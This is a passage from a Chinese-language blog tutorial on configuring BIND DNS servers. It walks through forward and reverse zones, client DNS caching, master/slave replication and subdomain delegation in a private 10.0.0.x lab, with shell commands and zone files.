bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@101 ~]<span class="hljs-comment"># cp -p /var/named/named.localhost /var/named/willoneday.org.zone</span><br><span class="hljs-comment">#如果没有加-p选项，需要修改所有者或权限。chgrp named willoneday.org.zone</span><br><br>[root@101 ~]<span class="hljs-comment"># vim /var/named/willoneday.org.zone </span><br><span class="hljs-variable">$TTL</span> 1D<br>@       IN SOA  master admin.willoneday.org. (<br>                                        0       ; serial<br>                                        1D      ; refresh<br>                                        1H      ; retry<br>                                        1W      ; expire<br>                                        3H )    ; minimum<br>        NS      master<br>master  A       10.0.0.101<br>www     A       10.0.0.102<br></code></pre></td></tr></table></figure><h4 id="（4）检查配置文件和数据库文件格式，并启动服务"><a href="#（4）检查配置文件和数据库文件格式，并启动服务" class="headerlink" title="（4）检查配置文件和数据库文件格式，并启动服务"></a>（4）检查配置文件和数据库文件格式，并启动服务</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@101 ~]<span class="hljs-comment"># named-checkconf </span><br>[root@101 ~]<span class="hljs-comment"># named-checkzone willoneday.org /var/named/willoneday.org.zone</span><br><br>[root@101 ~]<span class="hljs-comment"># systemctl start named          #第一次启动服务</span><br>[root@101 ~]<span class="hljs-comment"># rndc reload                    #不是第一次启动服务</span><br></code></pre></td></tr></table></figure><h4 id="（5）实现WEB服务"><a href="#（5）实现WEB服务" class="headerlink" title="（5）实现WEB服务"></a>（5）实现WEB服务</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#安装http服务</span><br>[root@102 ~]<span class="hljs-comment"># yum install httpd -y                     </span><br><span class="hljs-comment">#配置主页面</span><br>[root@102 ~]<span class="hljs-comment"># echo &quot;https://www.cnblogs.com/Willoneday&quot; &gt; /var/www/html/index.html</span><br><span class="hljs-comment">#启动服务</span><br>[root@102 ~]<span class="hljs-comment"># systemctl enable --now httpd</span><br></code></pre></td></tr></table></figure><h4 id="（6）在客户端实现测试"><a href="#（6）在客户端实现测试" class="headerlink" title="（6）在客户端实现测试"></a>（6）在客户端实现测试</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@103 ~]<span class="hljs-comment"># vim /etc/sysconfig/network-scripts/ifcfg-eth0</span><br>DNS1=10.0.0.101<br><br><span class="hljs-comment">#重启网络</span><br><span class="hljs-comment">#centos7 以上版执行现下面命令生效</span><br>[root@103 ~]<span class="hljs-comment"># nmcli con reload</span><br>[root@103 ~]<span class="hljs-comment"># nmcli con up eth0</span><br><span class="hljs-comment">#centos 6 执行下面命令生效</span><br>service network restart<br><span class="hljs-comment">#有以下记录，算是重启成功</span><br>[root@103 ~]<span class="hljs-comment"># cat /etc/resolv.conf                    </span><br><span class="hljs-comment"># Generated by NetworkManager</span><br>nameserver 10.0.0.101<br><br><span class="hljs-comment">#测试网页,能显示就是成功</span><br>[root@103 ~]<span class="hljs-comment"># curl www.willoneday.org          </span><br>https://www.cnblogs.com/Willoneday<br></code></pre></td></tr></table></figure><hr><h3 id="4-7-启用DNS客户端缓存功能"><a href="#4-7-启用DNS客户端缓存功能" class="headerlink" title="4.7 启用DNS客户端缓存功能"></a>4.7 启用DNS客户端缓存功能</h3><blockquote><p> 在高并发的服务器场景中,对DNS的服务器查询性能有较高的要求,如果在客户端启用DNS缓存功能,可以大幅减轻DNS服务器的压力,同时也能提高DNS客户端名称解析速度</p></blockquote><h4 id="4-7-1-nscd命令-CentOS-启用DNS客户端缓存"><a href="#4-7-1-nscd命令-CentOS-启用DNS客户端缓存" class="headerlink" title="4.7.1 nscd命令 CentOS 启用DNS客户端缓存"></a>4.7.1 nscd命令 CentOS 启用DNS客户端缓存</h4><blockquote><p>CentOS 默认没有启用DNS客户端缓存,安装nscd（Name Service Cache Daemon,名称服务缓存守护进程）包可以支持DNS缓存功能</p><p>减少DNS服务器压力,提高DNS查询速度</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@centos7 ~]<span class="hljs-comment"># yum -y install nscd</span><br>[root@centos7 ~]<span class="hljs-comment"># systemctl enable --now nscd</span><br><span class="hljs-comment">#查看缓存统计信息</span><br>[root@centos7 ~]<span class="hljs-comment"># nscd -g</span><br></code></pre></td></tr></table></figure><h4 id="4-7-2-Ubuntu-启用DNS客户端缓存"><a href="#4-7-2-Ubuntu-启用DNS客户端缓存" class="headerlink" title="4.7.2 Ubuntu 启用DNS客户端缓存"></a>4.7.2 Ubuntu 启用DNS客户端缓存</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#ubuntu 默认会启用DNS客户端缓存</span><br>[root@ubuntu01 ~]<span class="hljs-comment"># systemctl status systemd-resolved.service</span><br>● systemd-resolved.service - Network Name Resolution<br>     Loaded: loaded (/lib/systemd/system/systemd-resolved.service; enabled; vendor preset: enabled)<br>     Active: active (running) since Tue 2022-10-18 17:14:08 CST; 2 days ago<br>       Docs: man:systemd-resolved.service(8)<br>             https://www.freedesktop.org/wiki/Software/systemd/resolved<br>             https://www.freedesktop.org/wiki/Software/systemd/writing-network-configuration-managers<br>             https://www.freedesktop.org/wiki/Software/systemd/writing-resolver-clients<br>   Main PID: 70372 (systemd-resolve)<br>     Status: <span class="hljs-string">&quot;Processing requests...&quot;</span><br>      Tasks: 1 (<span class="hljs-built_in">limit</span>: 2236)<br>     Memory: 4.2M<br>     CGroup: /system.slice/systemd-resolved.service<br>             └─70372 /lib/systemd/systemd-resolved<br><br>Oct 18 20:10:12 ubuntu01 systemd-resolved[70372]: Using degraded feature <span class="hljs-built_in">set</span> (UDP) <span class="hljs-keyword">for</span> DNS server 10.0.0.2.<br>Oct 18 20:44:51 ubuntu01 systemd-resolved[70372]: Grace period over, resuming full feature <span class="hljs-built_in">set</span> (UDP+EDNS0) <span class="hljs-keyword">for</span> DNS server 10.0.0.2.<br>Oct 18 20:44:51 ubuntu01 systemd-resolved[70372]: Using degraded feature <span class="hljs-built_in">set</span> (UDP) <span class="hljs-keyword">for</span> DNS server 10.0.0.2.<br>Oct 20 19:34:57 ubuntu01 systemd-resolved[70372]: Using degraded feature <span class="hljs-built_in">set</span> (UDP) <span class="hljs-keyword">for</span> DNS server 10.0.0.2.<br>Oct 20 19:45:27 ubuntu01 systemd-resolved[70372]: Grace period over, resuming full feature <span class="hljs-built_in">set</span> (UDP+EDNS0) <span class="hljs-keyword">for</span> DNS server 10.0.0.2.<br>Oct 20 19:45:27 ubuntu01 systemd-resolved[70372]: Using degraded feature <span class="hljs-built_in">set</span> (UDP) <span class="hljs-keyword">for</span> DNS server 10.0.0.2.<br>Oct 20 20:09:24 ubuntu01 systemd-resolved[70372]: Grace period over, resuming full feature <span class="hljs-built_in">set</span> (UDP+EDNS0) <span class="hljs-keyword">for</span> DNS server 10.0.0.2.<br>Oct 20 20:09:24 ubuntu01 systemd-resolved[70372]: Using degraded feature <span class="hljs-built_in">set</span> (UDP) <span class="hljs-keyword">for</span> DNS server 10.0.0.2.<br>Oct 20 20:52:26 ubuntu01 systemd-resolved[70372]: Grace period over, resuming full feature <span class="hljs-built_in">set</span> (UDP+EDNS0) <span class="hljs-keyword">for</span> DNS server 10.0.0.2.<br>Oct 20 20:52:26 ubuntu01 systemd-resolved[70372]: Using degraded feature <span class="hljs-built_in">set</span> (UDP) <span class="hljs-keyword">for</span> DNS server 10.0.0.2.<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#清空缓存</span><br>[root@ubuntu1804 ~]<span class="hljs-comment"># systemd-resolve --flush-caches</span><br><br><span class="hljs-comment">#查看</span><br>[root@ubuntu1804 ~]<span class="hljs-comment"># systemd-resolve --statistics</span><br></code></pre></td></tr></table></figure><hr><h3 id="5-实现反向解析区域"><a href="#5-实现反向解析区域" class="headerlink" title="5 实现反向解析区域"></a>5 实现反向解析区域</h3><h4 id="5-1-反向解析配置"><a href="#5-1-反向解析配置" class="headerlink" title="5.1 反向解析配置"></a>5.1 反向解析配置</h4><blockquote><p>反向区域：即将IP反向解析为FQDN</p><p>区域名称：网络地址反写**.in-addr.arpa.**</p></blockquote><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">172.16.100. --&gt; 100.16.172.in-addr.arpa.<br></code></pre></td></tr></table></figure><h5 id="（1）定义区域"><a href="#（1）定义区域" class="headerlink" title="（1）定义区域"></a>（1）定义区域</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">zone <span class="hljs-string">&quot;ZONE_NAME&quot;</span> IN &#123;<br>     <span class="hljs-built_in">type</span> &#123;master|slave|forward&#125;；<br>     file <span class="hljs-string">&quot;网络地址.zone&quot;</span><br>&#125;;<br></code></pre></td></tr></table></figure><h5 id="（2）定义区域解析库文件-1"><a href="#（2）定义区域解析库文件-1" class="headerlink" title="（2）定义区域解析库文件"></a>（2）定义区域解析库文件</h5><p>注意：不需要A记录,以PTR记录为主</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$TTL</span> 1D<br>@       IN SOA  master admin.willoneday.org. (<br>                                        0       ; serial<br>                                        1D      ; refresh<br>                                        1H      ; retry<br>                                        1W      ; expire<br>                                        3H )    ; minimum<br>        NS      master.<br>111     PTR     www.willoneday.org.<br>222     PTR     db.willoneday.org.<br></code></pre></td></tr></table></figure><h4 id="5-2-实战案例-反向解析"><a href="#5-2-实战案例-反向解析" class="headerlink" title="5.2 实战案例: 反向解析"></a>5.2 实战案例: 反向解析</h4><h5 id="（1）操作"><a href="#（1）操作" class="headerlink" title="（1）操作"></a>（1）操作</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@101 ~]<span class="hljs-comment">#  cat /etc/named.conf </span><br>options &#123;<br> ......<br> listen-on port 53 &#123; localhost; &#125;;<br> ......<br> allow-query     &#123; any; &#125;;<br> ......<br>&#125;<br><br>[root@101 ~]<span class="hljs-comment"># vim /etc/named.rfc1912.zones</span><br>zone <span class="hljs-string">&quot;0.0.10.in-addr.arpa&quot;</span> &#123;<br>   <span class="hljs-built_in">type</span> master;<br>   file <span class="hljs-string">&quot;10.0.0.zone&quot;</span>;<br>&#125;;<br><br>[root@101 ~]<span class="hljs-comment"># cd /var/named</span><br>[root@101 named]<span class="hljs-comment"># cp -p named.loopback 10.0.0.zone</span><br>[root@101 named]<span class="hljs-comment"># cat 10.0.0.zone </span><br><span class="hljs-variable">$TTL</span> 1D<br>@       IN SOA  master admin.willoneday.org. (<br>                                        0       ; serial<br>                                        1D      ; refresh<br>                                        1H      ; retry<br>                                        1W      ; expire<br>                                        3H )    ; minimum<br>        NS      master. <span class="hljs-comment">#NS记录必须以点结束，否则需要配置A记录才可以启动</span><br>111     PTR     www.willoneday.org.<br>222     PTR     db.willoneday.org.<br><br>[root@101 named]<span class="hljs-comment"># named-checkzone 0.0.10.in-addr.arpa 10.0.0.zone </span><br>zone 0.0.10.in-addr.arpa/IN: loaded serial 0<br>OK<br></code></pre></td></tr></table></figure><h5 id="（2）测试"><a href="#（2）测试" class="headerlink" title="（2）测试"></a>（2）测试</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@103 ~]<span class="hljs-comment"># cat /etc/resolv.conf </span><br><span class="hljs-comment"># Generated by NetworkManager</span><br>nameserver 10.0.0.101<br>[root@103 ~]<span class="hljs-comment">#  </span><br>[root@103 ~]<span class="hljs-comment"># dig -t ptr 111.0.0.10.in-addr.arpa.    </span><br><br>; &lt;&lt;&gt;&gt; DiG 9.11.4-P2-RedHat-9.11.4-26.P2.el7_9.10 &lt;&lt;&gt;&gt; -t ptr 111.0.0.10.in-addr.arpa.<br>;; global options: +cmd<br>;; Got answer:<br>;; -&gt;&gt;HEADER&lt;&lt;- <span class="hljs-string">opcode: QUERY, status: NOERROR, id: 17985</span><br><span class="hljs-string">;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 1</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; OPT PSEUDOSECTION:</span><br><span class="hljs-string">; EDNS: version: 0, flags:; udp: 4096</span><br><span class="hljs-string">;; QUESTION SECTION:</span><br><span class="hljs-string">;111.0.0.10.in-addr.arpa.       IN      PTR</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; ANSWER SECTION:</span><br><span class="hljs-string">111.0.0.10.in-addr.arpa. 86400  IN      PTR     www.willoneday.org.</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; AUTHORITY SECTION:</span><br><span class="hljs-string">0.0.10.in-addr.arpa.    86400   IN      NS      master.</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; Query time: 1 msec</span><br><span class="hljs-string">;; SERVER: 10.0.0.101#53(10.0.0.101)</span><br><span class="hljs-string">;; WHEN: Fri Oct 21 10:29:03 CST 2022</span><br><span class="hljs-string">;; MSG SIZE  rcvd: 104</span><br></code></pre></td></tr></table></figure><hr><h2 id="6-实现从服务器"><a href="#6-实现从服务器" class="headerlink" title="6 实现从服务器"></a>6 实现从服务器</h2><blockquote><p>只有一台主DNS服务器，存在单点失败的问题，可以建立主DNS服务器的备份服务器，即从服务器来实现DNS服务的容错机制。从服务器可以自动和主服务器进行单向的数据同步，从而和主DNS服务器一样，也可以对外提供查询服务，但从服务器不提供数据更新服务。</p></blockquote><h3 id="6-1-DNS从服务器"><a href="#6-1-DNS从服务器" class="headerlink" title="6.1 DNS从服务器"></a>6.1 DNS从服务器</h3><blockquote><ol><li>应该为一台独立的名称服务器</li><li><strong>主服务器的区域解析库文件中必须有一条NS记录指向从服务器</strong></li><li>从服务器只需要定义区域，而无须提供解析库文件；解析库文件应该放置于/var/named/slaves/目录中</li><li>主服务器得允许从服务器作区域传送</li><li>主从服务器时间应该同步，可通过ntp进行</li><li><strong>bind程序的版本应该保持一致；否则，应该从高，主低</strong></li></ol></blockquote><h3 id="6-2-定义从区域"><a href="#6-2-定义从区域" class="headerlink" title="6.2 定义从区域"></a>6.2 定义从区域</h3><p>格式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">zone <span class="hljs-string">&quot;ZONE_NAME&quot;</span> IN &#123;<br>     <span class="hljs-built_in">type</span> slave;<br>     masters &#123; MASTER_IP; &#125;;<br>     file <span class="hljs-string">&quot;slaves/ZONE_NAME.zone&quot;</span>;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="6-3-实战案例：实现DNS从服务器"><a href="#6-3-实战案例：实现DNS从服务器" class="headerlink" title="6.3 实战案例：实现DNS从服务器"></a>6.3 实战案例：实现DNS从服务器</h3><blockquote><p><strong>实验目的</strong></p><ul><li>搭建DNS主从服务器架构，实现DNS服务冗余</li></ul><p><strong>环境要求</strong></p><ul><li>需要四台主机</li><li>DNS主服务器：10.0.0.101</li><li>DNS从服务器:10.0.0.104</li><li>web服务器：10.0.0.102</li><li>DNS客户端：10.0.0.103</li></ul><p><strong>前提准备</strong></p><ul><li>关闭SElinux</li><li>关闭防火墙</li><li>时间同步</li></ul></blockquote><h4 id="（1）主DNS服务端配置"><a href="#（1）主DNS服务端配置" class="headerlink" title="（1）主DNS服务端配置"></a>（1）主DNS服务端配置</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@101 ~]<span class="hljs-comment"># yum install bind -y</span><br><br>[root@101 ~]<span class="hljs-comment"># vim /etc/named.conf</span><br><span class="hljs-comment">#注释掉下面两行</span><br>// listen-on port 53 &#123; 127.0.0.1; &#125;;<br>// allow-query     &#123; localhost; &#125;;<br><span class="hljs-comment">#只允许从服务器进行区域传输</span><br>allow-transfer &#123; 从服务器IP;&#125;; <br><br>[root@101 ~]<span class="hljs-comment"># vim /etc/named.rfc1912.zones    </span><br><span class="hljs-comment">#加上这段</span><br>zone <span class="hljs-string">&quot;willoneday.org&quot;</span> IN &#123;<br>        <span class="hljs-built_in">type</span> master;<br>        file <span class="hljs-string">&quot;willoneday.org.zone&quot;</span>;<br>&#125;;<br><br>[root@101 ~]<span class="hljs-comment"># cp -p /var/named/named.localhost /var/named/willoneday.org.zone</span><br><span class="hljs-comment">#如果没有-p，需要改权限。chgrp named willoneday.org.zone</span><br><br>[root@101 ~]<span class="hljs-comment"># vim /var/named/willoneday.org.zone </span><br><span class="hljs-variable">$TTL</span> 1D<br>@       IN SOA  master admin.willoneday.org. (<br>                                        4       ; serial<br>                                        1D      ; refresh<br>                                        1H      ; retry<br>                                        1W      ; expire<br>                                        3H )    ; minimum<br>        NS      master<br>        NS      slave<br>master  A       10.0.0.101<br>slave   A       10.0.0.104<br>www     A       1.1.1.1<br>db      A       2.2.2.2<br><br>[root@101 ~]<span class="hljs-comment"># systemctl start named      #第一次启动服务</span><br>[root@101 ~]<span class="hljs-comment"># rndc reload                #不是第一次启动服务</span><br></code></pre></td></tr></table></figure><h4 id="（2）从DNS服务器配置"><a href="#（2）从DNS服务器配置" class="headerlink" title="（2）从DNS服务器配置"></a>（2）从DNS服务器配置</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@104 ~]<span class="hljs-comment"># yum install -y bind</span><br><br>[root@104 ~]<span class="hljs-comment"># vim /etc/named.conf</span><br>// listen-on port 53 &#123; 127.0.0.1; &#125;;<br>// allow-query     &#123; localhost; &#125;;<br><span class="hljs-comment">#不允许其它主机进行区域传输</span><br>allow-transfer &#123; none;&#125;;<br><br>[root@104 ~]<span class="hljs-comment"># vim /etc/named.rfc1912.zones</span><br>zone <span class="hljs-string">&quot;willoneday.org&quot;</span> &#123;<br>       <span class="hljs-built_in">type</span> slave;<br>       masters &#123; 主服务器IP;&#125;;                                                               <br>       file <span class="hljs-string">&quot;slaves/willoneday.org.slave&quot;</span>;<br>&#125;;<br><br>[root@104 ~]<span class="hljs-comment"># systemctl start named #第一次启动服务</span><br>[root@104 ~]<span class="hljs-comment"># rndc reload        #不是第一次启动服务</span><br><br>[root@104 ~]<span class="hljs-comment"># ll /var/named/slaves/willoneday.org.slave #查看区域数据库文件是否生成</span><br></code></pre></td></tr></table></figure><h4 id="（3）客户端测试主从DNS服务架构"><a href="#（3）客户端测试主从DNS服务架构" class="headerlink" title="（3）客户端测试主从DNS服务架构"></a>（3）客户端测试主从DNS服务架构</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@103 ~]<span class="hljs-comment"># vim /etc/sysconfig/network-scripts/ifcfg-eth0</span><br>DNS1=主服务器<br>DNS2=从服务器<br>[root@103 ~]<span class="hljs-comment"># systemctl restart network</span><br><br><span class="hljs-comment">#验证从DNS服务器是否可以查询</span><br>[root@103 ~]<span class="hljs-comment"># dig www.willoneday.org</span><br>[root@103 ~]<span class="hljs-comment"># curl www.willoneday.org</span><br><br><span class="hljs-comment">#在主服务器上停止DNS服务</span><br>[root@101 ~]<span class="hljs-comment"># systemctl stop named</span><br><br><span class="hljs-comment">#验证从DNS服务器仍然可以查询</span><br>[root@103 ~]<span class="hljs-comment"># dig www.willoneday.org </span><br>[root@103 ~]<span class="hljs-comment"># curl www.willoneday.org</span><br></code></pre></td></tr></table></figure><hr><h2 id="7-实现子域"><a href="#7-实现子域" class="headerlink" title="7 实现子域"></a>7 实现子域</h2><h3 id="7-1-子域委派授权"><a href="#7-1-子域委派授权" class="headerlink" title="7.1 子域委派授权"></a>7.1 子域委派授权</h3><p> 将子域委派给其它主机管理，实现分布式DNS数据库</p><p>正向解析区域子域方法</p><h4 id="范例：定义两个子域区域"><a href="#范例：定义两个子域区域" class="headerlink" title="范例：定义两个子域区域"></a>范例：定义两个子域区域</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">shanghai.willoneday.org. IN NS ns1.ops.willoneday.org.<br>shanghai.willoneday.org. IN NS ns2.ops.willoneday.org.<br>shenzhen.willoneday.org. IN NS ns1.shenzhen.willoneday.org.<br>shenzhen.willoneday.org. IN NS ns2.shenzhen.willoneday.org.<br>ns1.shanghai.willoneday.org. IN A 1.1.1.1<br>ns2.shanghai.willoneday.org. IN A 1.1.1.2<br>ns1.shenzhen.willoneday.org. IN A 1.1.1.3<br>ns2.shenzhen.willoneday.org. IN A 1.1.1.4<br></code></pre></td></tr></table></figure><h3 id="7-2-实战范例：实现DNS父域和子域服务"><a href="#7-2-实战范例：实现DNS父域和子域服务" class="headerlink" title="7.2 实战范例：实现DNS父域和子域服务"></a>7.2 实战范例：实现DNS父域和子域服务</h3><blockquote><p><strong>实验目的</strong></p><ul><li>搭建DNS父域和子域服务器</li></ul><p><strong>环境要求</strong></p><ul><li>需要五台主机</li><li>DNS父域服务器：10.0.0.101</li><li>DNS子域服务器：10.0.0.104</li><li>父域的web服务器：10.0.0.102，<a href="http://www.willoneday.org/">www.willoneday.org</a></li><li>子域的web服务器：10.0.0.105,<a href="http://www.shanghai.willoneday.org/">www.shanghai.willoneday.org</a></li><li>DNS客户端：10.0.0.103</li></ul><p><strong>前提准备</strong></p><ul><li>关闭SElinux</li><li>关闭防火墙</li><li>时间同步</li></ul></blockquote><h4 id="（1）在父域DNS服务器上实现主willoneday-org域的主DNS服务"><a href="#（1）在父域DNS服务器上实现主willoneday-org域的主DNS服务" class="headerlink" title="（1）在父域DNS服务器上实现主willoneday.org域的主DNS服务"></a>（1）在父域DNS服务器上实现主willoneday.org域的主DNS服务</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@101 ~]<span class="hljs-comment"># yum install bind -y</span><br><br>[root@101 ~]<span class="hljs-comment"># vim /etc/named.conf</span><br><span class="hljs-comment">#注释掉下面两行</span><br>// listen-on port 53 &#123; 127.0.0.1; &#125;;<br>// allow-query     &#123; localhost; &#125;;<br><span class="hljs-comment">#只允许从服务器进行区域传输</span><br>allow-transfer &#123; 从服务器IP;&#125;; <br><span class="hljs-comment">#建议关闭加密验证</span><br>dnssec-enable no; <br>dnssec-validation no;<br><br>[root@101 ~]<span class="hljs-comment"># vim /etc/named.rfc1912.zones</span><br><span class="hljs-comment">#加上这段</span><br>zone <span class="hljs-string">&quot;willoneday.org&quot;</span> IN &#123;<br>        <span class="hljs-built_in">type</span> master;<br>        file <span class="hljs-string">&quot;willoneday.org.zone&quot;</span>;<br>&#125;;<br><br>[root@101 ~]<span class="hljs-comment"># cp -p /var/named/named.localhost /var/named/willoneday.org.zone</span><br><span class="hljs-comment">#如果没有-p，需要改权限。chgrp named willoneday.org.zone</span><br><br>[root@101 ~]<span class="hljs-comment"># vim /var/named/willoneday.org.zone </span><br><span class="hljs-variable">$TTL</span> 1D<br>@       IN SOA  master admin.willoneday.org. (<br>                                        4       ; serial<br>                                        1D      ; refresh<br>                                        1H      ; retry<br>                                        1W      ; expire<br>                                        3H )    ; minimum<br>                NS      master<br>shanghai        NS      shanghains<br>master          A       10.0.0.101<br>shanghains      A       10.0.0.104<br>www             A       10.0.0.102                <br><br>[root@101 ~]<span class="hljs-comment"># systemctl start named          #第一次启动服务</span><br>[root@101 ~]<span class="hljs-comment"># rndc reload                    #不是第一次启动服务</span><br></code></pre></td></tr></table></figure><h4 id="（2）实现子域的DNS服务器"><a href="#（2）实现子域的DNS服务器" class="headerlink" 